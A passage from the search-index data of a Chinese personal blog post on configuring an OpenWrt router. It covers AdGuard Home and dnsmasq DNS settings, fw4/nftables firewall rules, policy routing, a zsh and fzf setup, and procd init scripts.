</ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u67d0\u4e9b\u57df\u540d\u53ea\u8fd4\u56deipv6","title":"\u67d0\u4e9b\u57df\u540d\u53ea\u8fd4\u56deipv6","text":"<p>Is it possible to return only the ipv6 address when having both ipv4 and ipv6 addresses \u00b7 AdguardTeam/AdGuardHome \u00b7 Discussion #4482 (github.com)</p> <pre><code>||internal.my-campus.edu^$dnstype=A,dnsrewrite=NOERROR\n</code></pre> <p>\u5173\u4e8e\u662f\u5426\u652f\u6301prefer_ipv4\u7684\u8ba8\u8bba\uff1aPrefer IPv4/6. However, it does not affect the resolution of pure IPv6/4 domain names. \u00b7 Issue #5919 \u00b7 AdguardTeam/AdGuardHome (github.com)</p> <ul> <li>\u6709\u89c2\u70b9\u8ba4\u4e3a\u8fd9\u5e94\u8be5\u662fclient\u505a\u7684\u4e8b\u60c5</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u91cd\u542f\u540e\u65e0\u6cd5\u81ea\u542f\u52a8","title":"\u91cd\u542f\u540e\u65e0\u6cd5\u81ea\u542f\u52a8","text":"<p>\u662f\u7531\u4e8e\u542f\u52a8\u811a\u672c\u4f18\u5148\u7ea7\u51b2\u7a81\u5bfc\u81f4\u7684\u3002 AdguardHome doesn\u2019t start automatically \u89e3\u51b3\u65b9\u6cd5\u4e3a\u4fee\u6539procd\u542f\u52a8\u4f18\u5148\u7ea7:</p> <ul> <li>\u5220\u9664\u542f\u52a8\u8f6f\u8fde\u63a5\uff08\u4f4d\u4e8e<code>/etc/rc.d/</code>\uff09</li> </ul> <pre><code>service adguardhome disable\n</code></pre> <ul> <li>\u4fee\u6539\u542f\u52a8\u811a\u672c\u4e2d\u7684START\u548cSTOP\u503c\uff0c<code>vim /etc/init.d/adguardhome</code></li> </ul> <pre><code>START=95\nSTOP=01\n\n## starts after network starts\n#START=21\n## stops before networking stops\n#STOP=89\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u8bbe\u5907\u65e0\u6cd5\u83b7\u5f97dns","title":"\u8bbe\u5907\u65e0\u6cd5\u83b7\u5f97dns","text":"<p>\u53d1\u73b0\u624b\u673a\u8bbe\u5907\u4e0d\u80fd\u83b7\u5f97dns\u4e86\uff0c\u663e\u793a\u4e3a\u8fde\u4e0awifi\u540e\u663e\u793a\u65e0\u6cd5\u4e0a\u7f51\uff0c\u6d4f\u89c8\u5668\u6253\u4e0d\u5f00\u7f51\u9875\uff0c\u4f46\u662fapp\u5e94\u7528\u8c8c\u4f3c\u90fd\u6ca1\u6709\u95ee\u9898\u3002 \u89e3\u51b3\u529e\u6cd5\u662f\u5728/etc/config/dhcp\u4e2d\u6dfb\u52a0dns option\uff0c\u5f3a\u884c\u8bbe\u7f6edns\u3002</p> <pre><code>config dhcp 'lan'\n    ...\n    list dhcp_option '6,192.168.36.1'\n</code></pre> <p>\u8bb0\u5f55\u4e0bdnsmasq\u7684\u8bbe\u7f6e\uff0c\u770b\u4e0b\u662f\u5426\u662f\u4e0d\u5c0f\u5fc3\u6539\u9519\u4e86\u3002</p> <pre><code>config dnsmasq\n        option domainneeded '1'\n        option localise_queries '1'\n        option local '/lan/'\n        option domain 'lan'\n        option expandhosts '1'\n        option authoritative '1'\n        option readethers '1'\n        option leasefile '/tmp/dhcp.leases'\n        option localservice '1'\n        option ednspacket_max '1232'\n        option rebind_protection '0'\n        option port '54'\n        option localuse '1'\n        list server '127.0.0.1#7874'\n        option noresolv '1'\n        option cachesize '0'\n</code></pre> <p>Getting ''bad udp cksum'' when running tcpdump (f5.com) tcpdump\u65f6\u53d1\u73b0\u4e00\u4e2a\u6709\u610f\u601d\u7684\u95ee\u9898\uff0cdhcp reply\u663e\u793abad udp cksum</p> <p>This is an expected behavior as tcpdump tool on Linux because the checksum is offloading on your NIC but tcpdump reads IP packets from the Linux kernel right before the actual checksum takes place in the NIC chipset.</p> <pre><code>root@op2 \u279c  ~ tcpdump -nvvv -i eth1 port 67 and port 68\ntcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes\n12:55:06.175120 IP (tos 0x0, ttl 128, id 28628, offset 0, flags [none], proto UDP (17), length 328)\n    192.168.36.180.68 &gt; 192.168.36.1.67: [udp sum ok] BOOTP/DHCP, Request from 28:11:a8:27:40:3e, length 300, xid 0xab30355a, Flags [none] (0x0000)\n          Client-IP 192.168.36.180\n          Client-Ethernet-Address 28:11:a8:27:40:3e\n          Vendor-rfc1048 Extensions\n            Magic Cookie 0x63825363\n            DHCP-Message Option 53, length 1: Request\n            Client-ID Option 61, length 7: ether 28:11:a8:27:40:3e\n            Hostname Option 12, length 6: \"S3-Pro\"\n            FQDN Option 81, length 9: \"S3-Pro\"\n            Vendor-Class Option 60, length 8: \"MSFT 5.0\"\n            Parameter-Request Option 55, length 14:\n              Subnet-Mask, Default-Gateway, Domain-Name-Server, Domain-Name\n              Router-Discovery, Static-Route, Vendor-Option, Netbios-Name-Server\n              Netbios-Node, Netbios-Scope, Option 119, Classless-Static-Route\n              Classless-Static-Route-Microsoft, Option 252\n            END Option 255, length 0\n            PAD Option 0, length 0, occurs 2\n12:55:06.175586 IP (tos 0xc0, ttl 64, id 38812, offset 0, flags [none], proto UDP (17), length 340)\n    192.168.36.1.67 &gt; 192.168.36.180.68: [bad udp cksum 0xcb57 -&gt; 0x4904!] BOOTP/DHCP, Reply, length 312, xid 0xab30355a, Flags [none] (0x0000)\n          Client-IP 192.168.36.180\n          Your-IP 192.168.36.180\n          Server-IP 192.168.36.1\n          Client-Ethernet-Address 28:11:a8:27:40:3e\n          Vendor-rfc1048 Extensions\n            Magic Cookie 0x63825363\n            DHCP-Message Option 53, length 1: ACK\n            Server-ID Option 54, length 4: 192.168.36.1\n            Lease-Time Option 51, length 4: 43200\n            RN Option 58, length 4: 19452\n            RB Option 59, length 4: 35652\n            Subnet-Mask Option 1, length 4: 255.255.255.0\n            BR Option 28, length 4: 192.168.36.255\n            Default-Gateway Option 3, length 4: 192.168.36.1\n            Domain-Name Option 15, length 3: \"lan\"\n            FQDN Option 81, length 13: [SO] 255/255 \"S3-Pro.lan\"\n            Domain-Name-Server Option 6, length 4: 192.168.36.1\n            END Option 255, length 0\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u914d\u7f6e\u6587\u4ef6","title":"\u914d\u7f6e\u6587\u4ef6","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#upstream-dns-servers-settings","title":"Upstream DNS servers settings","text":"<ul> <li><code>bootstrap_dns</code>: List of DNS servers used for initial hostname resolution in case an upstream server name is a hostname.</li> <li><code>bootstrap_prefer_ipv6</code>: If\u00a0<code>true</code>, instructs the bootstrapper to prefer IPv6 addresses to IPv4 ones when resolving DoH, DoQ, and DoT hostnames.</li> </ul> <ul> <li><code>all_servers</code>: Enables parallel queries to all configured upstream servers to speed up resolving. If enabled, the queries are sent to each server simultaneously and the first response is chosen. If disabled, the queries are sent to each upstream server one-by-one and then sorted by RTT. Note that more stable upstream servers are preferred by the algorithm.</li> </ul> <p>DNS cache settings</p> <ul> <li><code>cache_size</code>\u00a0\u2014 DNS cache size (in bytes).</li> <li><code>cache_optimistic</code>\u00a0(since v0.107.0) \u2014 Make AdGuard Home respond from the cache even when the entries are expired and also try to refresh them. Before\u00a0v0.108.0-b.5\u00a0the TTL for such responses is 60 seconds and since\u00a0v0.108.0-b.5\u00a0it's 10 seconds.</li> </ul> <p>Other settings</p> <ul> <li><code>enable_dnssec</code>: Set DNSSEC flag in the outgoing DNS requests and check the result.</li> <li><code>aaaa_disabled</code>: Respond with an empty answer to all\u00a0<code>AAAA</code>\u00a0requests.</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9632\u706b\u5899","title":"\u9632\u706b\u5899","text":"<p>\u53c2\u8003</p> <ul> <li>fw3\u57fa\u4e8eiptable/netfilter\u5b9e\u73b0\uff1a[OpenWrt Wiki] Netfilter In OpenWrt</li> <li>\u5728\u542f\u52a8\u65f6\u8fd0\u884ciptable\uff08firewall.user\uff09\uff1aExecuting scripts at boot time - Installing and Using OpenWrt - OpenWrt Forum</li> </ul> <p>\u4ece22.03\u7248\u672c\u5f00\u59cb\uff0copenwrt firwall\u540e\u7aef\uff0c\u4eceiptables(fw3)\u6362\u6210\u4e86nftables(fw4)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#nftable","title":"nftable","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u53c2\u8003","title":"\u53c2\u8003","text":"<p>\u5feb\u901f\u5165\u95e8\uff1a[OpenWrt Wiki] nftables reference\uff1aMan page of NFT (netfilter.org)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u6253\u5370\u89c4\u5219","title":"\u6253\u5370\u89c4\u5219","text":"<p><code>fw4 print</code>\u00a0dumps the nftables configuration that is built by fw4 and passed to nftables. It contains slightly higher-level code than the raw nftables state: fw4 uses variables, include files\u2026</p> <p><code>nft list ruleset</code>\u00a0dumps the full nftables configuration from the kernel. This dump mixes data from different sources:</p> <ul> <li>rules generated by fw4</li> <li>rules included from external files (<code>/etc/nftables.d/*.nft</code>\u00a0or\u00a0<code>/usr/share/nftables.d/</code>)</li> <li>rules added manually through the\u00a0<code>nft</code>\u00a0command</li> </ul> <p><code>fw3 print</code>\u00a0is the main utility to inspect iptable rules. Additionally the\u00a0<code>iptable</code>\u00a0command can be used to sort the rules differently and retrieve packet counts for matching rules. There are a number of arguments but the two most useful examples are:</p> <pre><code>iptables -t &lt;table&gt; -vnL\niptables -t &lt;table&gt; -vS\n</code></pre> <p>where</p> <ul> <li>table is one of:\u00a0<code>filter</code>\u00a0(default),\u00a0<code>nat</code>,\u00a0<code>mangle</code></li> <li><code>-v</code>: verbose, includes packet counts and physical interface name</li> <li><code>-n</code>: numeric output</li> <li><code>-L</code>: list rules</li> <li><code>-S</code>: print rules The\u00a0<code>-L</code>\u00a0and\u00a0<code>-S</code>\u00a0arguments sort/format the output differently. The\u00a0<code>-S</code>\u00a0option is equivalent to using the\u00a0<code>iptable-save</code>\u00a0command.</li> </ul> <ul> <li>\u4e0d\u80fd\u6253\u5370fw4\uff0cnft\u751f\u6210\u7684\u89c4\u5219</li> <li>\u4f7f\u7528<code>iptables-save</code>\u6253\u5370\u6240\u6709table</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u914d\u7f6e\u6587\u4ef6_1","title":"\u914d\u7f6e\u6587\u4ef6","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>[OpenWrt Wiki] Firewall configuration /etc/config/firewall</p> <ul> <li>zone\uff1a\u5b9a\u4e49zone\u548c\u8def\u7531\u5668\u4e4b\u95f4(input, output)\uff0czone\u5185\u4e0d\u540c\u63a5\u53e3\u95f4\u7684(forward)\u89c4\u5219\u3002\u8fd8\u53ef\u4ee5\u5b9a\u4e49\u4ecezone\u51fa\u53bb\u7684masq</li> <li>forward: \u5b9a\u4e49zone\u4e4b\u95f4\u7684\u8f6c\u53d1</li> <li>rule\uff1a\u7528\u4e8e\u6307\u5b9a\u7279\u5b9ahost\uff0c\u7aef\u53e3\u662f\u5426\u5141\u8bb8\u653e\u884c\uff0c\u76f8\u5f53\u4e8e\u5bf9zone\u66f4\u7ec6\u7c92\u5ea6\u7684\u8865\u5145\u3002</li> <li>redirect\uff1aSNAT\uff0cDNAT</li> <li>include\uff1afw4(nftable), fw3(shell script\uff0c\u53ef\u4ee5\u4f7f\u7528iptable)</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ntftable\u5b9e\u73b0","title":"ntftable\u5b9e\u73b0","text":"<p>filter rules</p> <ul> <li>input, forward, output</li> <li>input_zone, forward_zone, output_zone</li> <li>accept_from_zone, accept_to_zone</li> </ul> <pre><code>        chain forward {\n                type filter hook forward priority filter; policy drop;\n\n                ct state established,related accept comment \"!fw4: Allow forwarded established and related flows\"\n                iifname { \"eth1\", \"wg0\", \"ztyou4dlov\" } jump forward_lan comment \"!fw4: Handle lan IPv4/IPv6 forward traffic\"\n                ...\n                jump handle_reject\n        }\n\n        chain forward_lan {\n                jump accept_to_wan comment \"!fw4: Accept lan to wan forwarding\"\n                jump accept_to_wg_s2s comment \"!fw4: Accept lan to wg_s2s forwarding\"\n                ct status dnat accept comment \"!fw4: Accept port forwards\"\n                jump accept_to_lan\n        }\n\n        chain accept_to_wan {\n                oifname \"eth0\" counter accept comment \"!fw4: accept wan IPv4/IPv6 traffic\"\n        }\n</code></pre> <p>nat rules</p> <ul> <li>dstnat</li> <li>srcnat</li> <li>dstnat_zone</li> <li>srcnat_zone</li> </ul> <pre><code>        chain srcnat {\n                type nat hook postrouting priority srcnat; policy accept;\n                oifname { \"eth1\", \"wg0\", \"ztyou4dlov\" } jump srcnat_lan comment \"!fw4: Handle lan IPv4/IPv6 srcnat traffic\"\n                oifname \"eth0\" jump srcnat_wan comment \"!fw4: Handle wan IPv4/IPv6 srcnat traffic\"\n                oifname \"wg_s2s\" jump srcnat_wg_s2s comment \"!fw4: Handle wg_s2s IPv4/IPv6 srcnat traffic\"\n        }\n\n        chain srcnat_wg_s2s {\n                ip saddr 10.0.33.0/24 counter snat 10.0.33.2 comment \"!fw4: wg1-snat\"\n        }\n</code></pre> <p>raw rules mangle rules</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u81ea\u5b9a\u4e49\u89c4\u5219","title":"\u81ea\u5b9a\u4e49\u89c4\u5219","text":"<p>[OpenWrt Wiki] Firewall configuration /etc/config/firewall</p> <p>\u6709\u65f6\u4e0d\u6ee1\u8db3\u4e8e\u4f7f\u7528openwrt\u63d0\u4f9b\u7684\u65b9\u5f0f\u8bbe\u7f6e\u9632\u706b\u5899\uff0c\u800c\u60f3\u8981\u76f4\u63a5\u8fd0\u884ciptable\u547d\u4ee4\u6216\u8005nftable\u547d\u4ee4\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4f7f\u7528<code>/etc/config/firewall</code>\u4e2d<code>include</code>\u7c7b\u578b\u7528\u4e8e\u81ea\u5b9a\u4e49\u89c4\u5219\u3002\u5305\u542b\u51e0\u79cd\u7c7b\u578b</p> <ul> <li>nftable\u65b9\u5f0f\uff0c\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\u4fdd\u5b58nftable\u89c4\u5219</li> <li>scipt\u65b9\u5f0f\uff0c\u76f4\u63a5\u8fd0\u884ciptable\u6216\u8005nftable\u547d\u4ee4 \u7531\u4e8eopenwrt 22.04\u540enftable\u53d6\u4ee3\u4e86iptable\uff0c\u56e0\u6b64\u5b98\u65b9\u63a8\u8350\u4f7f\u7528nftable\u65b9\u5f0f\u3002</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#nftable_1","title":"nftable","text":"<p>\u5728\u6307\u5b9a\u4f4d\u7f6e\u63d2\u5165\u81ea\u5b9a\u4e49table\uff0cchain\u6216\u5219rule \u4f4d\u7f6e\uff1a</p> ruleset-pre At the very beginning, before the fw4 table definition ruleset-post At the very end, after the fw4 table definition table-pre At the beginning of the fw4 table, before any chain definition table-post At the end of the fw4 table, after all chains definition chain-pre At the beginning of $chain (defined in option chain), before rules in this chain chain-post At the end of $chain (defined in option chain), after rules in this chain <pre><code># /etc/config/firewall\nconfig include\n option type  'nftables'\n option path  '/etc/my_custom_firewall_rule.nft'\n option position 'chain-pre'\n option chain  'input_wan'\n\u00a0\n# /etc/my_custom_firewall_rule.nft\ntcp dport 0-1023 log prefix \"Inbound WAN connection attempt to low TCP port: \"\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#script","title":"script","text":"<p>\u53ef\u4ee5\u4f7f\u7528iptables\u547d\u4ee4\uff08fw3\uff09\u6216\u8005nftables\u547d\u4ee4</p> <pre><code>config include\n        option enabled  1\n        option type  'script'\n        option path  '/etc/firewall.user'\n        option fw4_compatible 1   # \u4f7f\u7528nftables\u547d\u4ee4\u9700\u8981\u6307\u5b9a\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7b56\u7565\u8def\u7531","title":"\u7b56\u7565\u8def\u7531","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#gui\u914d\u7f6e\u6587\u4ef6","title":"GUI/\u914d\u7f6e\u6587\u4ef6","text":"<p>\u901a\u8fc7iproute2\u8bbe\u7f6e\u7684\u7b56\u7565\u8def\u7531\u4e0d\u77e5\u5982\u4f55\u4fdd\u5b58\u3002openwrt\u652f\u6301\u5176\u5b83\u7684\u65b9\u5f0f\u8bbe\u7f6e\uff0c\u5728luci\u4e2d\u53ef\u4ee5\u624b\u52a8\u6dfb\u52a0\u7b56\u7565\u8def\u7531\uff0c\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p></p> <p>\u4f1a\u5728<code>network</code>\u6587\u4ef6\u4e2d\u751f\u6210\u5982\u4e0b\u4e24\u6761</p> <pre><code>config rule\n        option priority '20'\n        option lookup '2'\n\nconfig route\n        option target '114.214.160.0/19'\n        option gateway '114.214.236.254'\n        option table '2'\n        option interface 'wan'\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7cfb\u7edf","title":"\u7cfb\u7edf","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u57fa\u672c\u8f6f\u4ef6\u5305","title":"\u57fa\u672c\u8f6f\u4ef6\u5305","text":"<pre><code>git curl wget\nzsh vim-full  tmux\nmtr iperf3\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u4f7f\u7528zsh","title":"\u4f7f\u7528ZSH","text":"<p>\u53c2\u8003\uff1aInstall oh-my-zsh on openwrt/lede-project (github.com)</p> <p>\u5b89\u88c5\u5fc5\u8981\u7684\u5305</p> <pre><code>opkg update &amp;&amp; opkg install ca-certificates zsh curl git-http\n</code></pre> <p>\u5b89\u88c5oh-my-zsh\uff0c\u811a\u672c\u5b89\u88c5\u53ef\u80fd\u4f1a\u5361\u4f4f\uff0c\u53ef\u4ee5\u624b\u52a8\u5b89\u88c5\uff08\u89c1\u540e\uff09\u3002</p> <p>\u9009\u62e9zsh\u4e3a\u9ed8\u8ba4shell</p> <pre><code>which zsh &amp;&amp; sed -i -- 's:/bin/ash:'`which zsh`':g' /etc/passwd\n</code></pre> <p>\u4e3a\u4e86\u907f\u514d\u56e0\u5220\u9664zsh\u5bfc\u81f4\u65e0\u6cd5\u767b\u5f55\uff0c\u53ef\u4ee5\u5728\u542f\u52a8\u811a\u672c<code>/etc/rc.local</code>\u4e2d\u8bbe\u7f6e\u81ea\u52a8fallback\u56deash</p> <pre><code># Revert root shell to ash if zsh is not available\nif grep -q '^root:.*:/usr/bin/zsh$' /etc/passwd &amp;&amp; [ ! -x /usr/bin/zsh ]; then\n    # zsh is root shell, but zsh was not found or not executable: revert to default ash\n    [ -x /usr/bin/logger ] &amp;&amp; /usr/bin/logger -s \"Reverting root shell to ash, as zsh was not found on the system\"\n    sed -i -- 's:/usr/bin/zsh:/bin/ash:g' /etc/passwd\nfi\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#oh-my-zsh\u624b\u52a8\u5b89\u88c5","title":"oh-my-zsh\u624b\u52a8\u5b89\u88c5","text":"<p>\u901a\u5e38\u6765\u8bf4curl\u83b7\u5f97install\u811a\u672c\u65f6\u4f1a\u5361\u4f4f\uff0cgit clone\u4ed3\u5e93\u65f6\u4e5f\u53ef\u80fd\u5361\u4f4f\uff0c\u6b64\u65f6\u4e0d\u5982\u624b\u52a8\u5b89\u88c5\uff0c\u67e5\u770binstall\u811a\u672c\uff0c\u4f1a\u53d1\u73b0\u5176\u5b9e\u53ea\u505a\u4e86\u51e0\u4ef6\u4e8b\u60c5\uff1a</p> <ul> <li>\u5c06oh-my-zsh\u4ed3\u5e93\u514b\u9686\u5230$HOME\u4e0b<code>.oh-my-zsh</code><ul> <li>\u53ef\u4ee5\u4ece\u5176\u4ed6\u8ba1\u7b97\u673ascp\u5230\u8def\u7531\u5668\u91cc</li> </ul> </li> <li>\u590d\u5236zshrc\u6587\u4ef6\uff1a<code>cp .oh-my-zsh/templates/zshrc.zsh-template .zshrc</code><ul> <li>\u76f4\u63a5\u590d\u5236\u5373\u53ef\uff0c\u4e0d\u7528\u4fee\u6539\u5185\u5bb9</li> </ul> </li> <li>chsh<ul> <li>openwrt\u6ca1\u6709chsh\u547d\u4ee4\uff0c\u9700\u8981\u4fee\u6539/etc/passwd</li> <li>\u6ce8\u610f\uff0c\u5982\u679c\u4fee\u6539\u9519\u8bef\uff08\u5982\u76f4\u63a5\u8f93\u5165zsh\u800c\u4e0d\u662f\u4ece\u6839\u5f00\u59cb\u7684\u5b8c\u6574\u8def\u5f84\uff09\u53ef\u80fd\u5bfc\u81f4\u65e0\u6cd5\u767b\u5f55openwrt</li> </ul> </li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#fzf\u624b\u52a8\u5b89\u88c5","title":"fzf\u624b\u52a8\u5b89\u88c5","text":"<p>\u60f3\u529e\u6cd5\u83b7\u5f97fzf\u4ed3\u5e93\uff0c\u53ef\u4ee5\u4ecex86\u7535\u8111scp\u3002</p> <pre><code>git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf\n~/.fzf/install  # \u4f9d\u8d56bash\uff0c\u53ef\u4ee5\u624b\u52a8\u6539\u4e3azsh\uff0c\u4f1a\u4e0b\u8f7dfzf\u53ef\u6267\u884c\u7a0b\u5e8f\u3002\u590d\u5236\u5230/bin\u76ee\u5f55\n</code></pre> <p>\u521b\u5efa.fzf.zsh\u6587\u4ef6</p> <pre><code># Auto-completion\n# ---------------\n[[ $- == *i* ]] &amp;&amp; source \"/root/.fzf/shell/completion.zsh\" 2&gt; /dev/null\n\n# Key bindings\n# ------------\nsource \"/root/.fzf/shell/key-bindings.zsh\"\n</code></pre> <p>zshrc\u4e2d\u6dfb\u52a0</p> <pre><code># fzf\n[ -f ~/.fzf.zsh ] &amp;&amp; source ~/.fzf.zsh\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#procd","title":"procd","text":"<ul> <li>\u6587\u6863\uff1a[OpenWrt Wiki] procd init scripts</li> <li>\u4f8b\u5b50\u8bb2\u89e3\uff1a[OpenWrt Wiki] Create a sample procd init script</li> </ul> <p>procd\u662f\u7528\u4e8e\u66ff\u4ee3init\u7684\u7cfb\u7edf\u542f\u52a8\u7ba1\u7406\u8f6f\u4ef6\uff08\u8fdb\u7a0b\u53f7\u4e3a1\uff0c\u547d\u4ee4/sbin/procd\uff09</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u793a\u4f8b","title":"\u793a\u4f8b","text":"<ul> <li>START\u7528\u4e8e\u63a7\u5236\u542f\u52a8\u987a\u5e8f\uff08\u4ece\u5c0f\u5230\u5927\u542f\u52a8\uff09<ul> <li>\u901a\u8fc7<code>ls -al /etc/rc.d/</code>\u67e5\u770b\u542f\u52a8\u987a\u5e8f</li> </ul> </li> <li>procd\u4f7f\u7528openwrt UCI\u914d\u7f6e\u63a5\u53e3\u3002\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e<code>/etc/config/myservice</code>\uff0c\u901a\u8fc7<code>CONFIGURATION=myservice</code>\u6307\u5b9a</li> <li><code>procd_set_param command</code>\u8bbe\u7f6e\u670d\u52a1\u8fd0\u884c\u547d\u4ee4</li> <li><code>procd_set_param stdout 1</code>\u5c06\u8f93\u51fa\u91cd\u5b9a\u5411\u5230logd\u3002\u901a\u8fc7logread\u67e5\u770b</li> </ul> <pre><code>#!/bin/sh /etc/rc.common\n\u00a0\nUSE_PROCD=1\n\u00a0\nSTART=95\nSTOP=01\n\u00a0\nCONFIGURATION=myservice\n\u00a0\nstart_service() {\n    # Reading config\n    config_load \"${CONFIGURATION}\"\n    local name\n    local every\n\u00a0\n    config_get name hello name\n    config_get every hello every\n\u00a0\n    procd_open_instance\n\u00a0\n    # pass config to script on start\n    procd_set_param command /bin/sh \"/var/myscript.sh\" \"$name\" \"$every\"\n    procd_set_param file /etc/config/myservice\n    procd_set_param stdout 1\n    procd_set_param stderr 1\n    